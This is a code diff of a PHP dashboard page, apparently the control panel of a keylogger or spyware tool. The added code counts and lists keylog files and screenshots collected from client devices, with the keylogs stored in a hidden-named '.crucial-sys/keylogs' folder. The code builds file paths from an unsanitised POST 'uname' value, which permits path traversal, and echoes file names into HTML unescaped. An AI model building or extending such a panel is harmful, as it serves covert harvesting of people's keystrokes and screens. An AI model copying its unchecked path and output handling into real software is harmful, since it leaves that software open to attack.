@@ -6,6 +6,9 @@
       header("location:login_page.html");
    }
 ?>
+<?php
+    $uname = $_POST["uname"];
+?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -25,6 +28,49 @@
   <link href="../documentation/css/material-dashboard.css?v=2.1.2" rel="stylesheet" />
   <!-- CSS Just for demo purpose, don't include it in your project -->
   <link href="../documentation/demo/demo.css" rel="stylesheet" />
+  <?php
+        $scFileDir = "/var/log/client_devices/$uname";
+        $filecount = 0;
+        $files = scandir($scFileDir);
+        $filecount = count($files);
+
+        $txtFileDir = "/usr/share/fileupload/home/$uname/.crucial-sys/keylogs";
+        $filecount2 = 0;
+        $files2 = scandir($txtFileDir);
+        $filecount2 = count($files2)-2;
+
+        $sumFileCount = $filecount + $filecount2;
+        $percentFileCount1 = ($filecount / $sumFileCount) * 100;
+        $percentFileCount2 = ($filecount2 / $sumFileCount) * 100;
+
+        $dataPoints = array(
+            array("label"=>"Keylog Files", "y"=>$percentFileCount2),
+            array("label"=>"Screenshots", "y"=>$percentFileCount1),
+        )
+    ?>
+    <script>
+        window.onload = function() {
+
+
+        var chart = new CanvasJS.Chart("chartContainer", {
+    	animationEnabled: true,
+    	title: {
+	    	text: ""
+    	},
+    	subtitles: [{
+    		text: ""
+    	}],
+	    data: [{
+	    	type: "pie",
+	    	yValueFormatString: "#,##0.00\"%\"",
+	    	indexLabel: "{label} ({y})",
+	    	dataPoints: <?php echo json_encode($dataPoints, JSON_NUMERIC_CHECK); ?>
+	    }]
+    });
+    chart.render();
+
+    }
+    </script>
 </head>
 
 <body class="">
@@ -96,11 +142,32 @@
               <div id="typography">
                 <div class="row">
                   <div class="col-md-12">
-                    <p>
-                      <ul>
-                    <li>test one</li>
-                  </ul>
-                    </p>
+                       <div class="card  card-tasks">
+                            <div class="card-header ">
+                             <h4 class="card-title">Screenshots</h4>
+                            </div>
+                            <div class="card-body ">
+                                <?php
+                                    echo "Here are the files for our screenshots<br><br>";
+                                    $path = "/var/log/client_devices/$uname";
+                                    $dh = opendir($path);
+                                    $i=1;
+                                    while (($file = readdir($dh)) !== false) {
+                                        if($file != "." && $file != ".." && $file != "sample.php" && $file != ".htaccess" && $file != "error_log" && $file != "cgi-bin") {
+                                        echo "<a href='/var/log/client_devices/" . $uname . "/$file'>$file</a><br /><br />";
+                                        $i++;
+                                            }
+                                        }
+                                    closedir($dh);
+                                ?>
+                            </div>
+                            <div class="card-footer ">
+                            <hr>
+                            <div class="stats">
+                                <i class="fa fa-check"></i> Data has been update!
+                            </div>
+                        </div>
+                    </div>
                   </div>
                 </div>
               </div>
